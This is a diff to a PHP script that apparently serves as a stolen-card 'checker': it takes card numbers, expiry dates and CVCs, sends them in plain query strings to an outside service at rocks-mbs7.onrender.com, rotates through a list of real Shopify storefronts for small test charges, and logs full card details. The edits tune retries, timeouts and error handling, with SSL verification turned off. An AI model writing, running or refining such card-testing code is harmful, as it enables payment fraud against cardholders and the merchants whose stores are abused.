@@ -12,7 +12,7 @@ function log_message($message) {
     file_put_contents($log_file, date('Y-m-d H:i:s') . " - $message\n", FILE_APPEND);
 }
 
-// List of available sites (with https://)
+// List of available sites with https://
  $sites = [
     'https://candy-edventure.myshopify.com',
     'https://jamielynnhome.myshopify.com',
@@ -61,22 +61,21 @@ function log_message($message) {
 ];
 
 // Function to check a single card via Shopify 1$ API with retry and site rotation
-function checkCard($card_number, $exp_month, $exp_year, $cvc, $retry = 2) {
+function checkCard($card_number, $exp_month, $exp_year, $cvc, $retry = 1) {
     global $sites, $dead_site_keywords;
     $card_details = "$card_number|$exp_month|$exp_year|$cvc";
     $encoded_cc = urlencode($card_details);
     
     // Try each site until we get a valid response
     foreach ($sites as $site) {
-        // Construct the API URL properly
-        $api_url = "https://rocks-mbs7.onrender.com/index.php?site=" . urlencode($site) . "&cc=" . $encoded_cc;
+        $api_url = "https://rocks-mbs7.onrender.com/index.php?site=$site&cc=$encoded_cc";
         log_message("Checking card: $card_details, URL: $api_url");
         
         for ($attempt = 0; $attempt <= $retry; $attempt++) {
             $ch = curl_init();
             curl_setopt($ch, CURLOPT_URL, $api_url);
             curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-            curl_setopt($ch, CURLOPT_TIMEOUT, 60); // Increased timeout to 60 seconds
+            curl_setopt($ch, CURLOPT_TIMEOUT, 50); // 50-second timeout as requested
             curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
             curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Insecure; enable in production
 
@@ -88,13 +87,7 @@ function checkCard($card_number, $exp_month, $exp_year, $cvc, $retry = 2) {
 
             log_message("Attempt " . ($attempt + 1) . " for $card_details on $site: HTTP $http_code, cURL errno $curl_errno, Response: " . substr($response, 0, 100));
 
-            // Handle 504 Gateway Timeout specifically
-            if ($http_code == 504) {
-                log_message("504 Gateway Timeout for $card_details on $site, retrying with next site...");
-                continue 2; // Skip to next site immediately
-            }
-
-            // Handle other API errors
+            // Handle API errors
             if ($response === false || $http_code !== 200 || !empty($curl_error)) {
                 if ($curl_errno == CURLE_OPERATION_TIMEDOUT && $attempt < $retry) {
                     log_message("Timeout for $card_details on $site, retrying...");
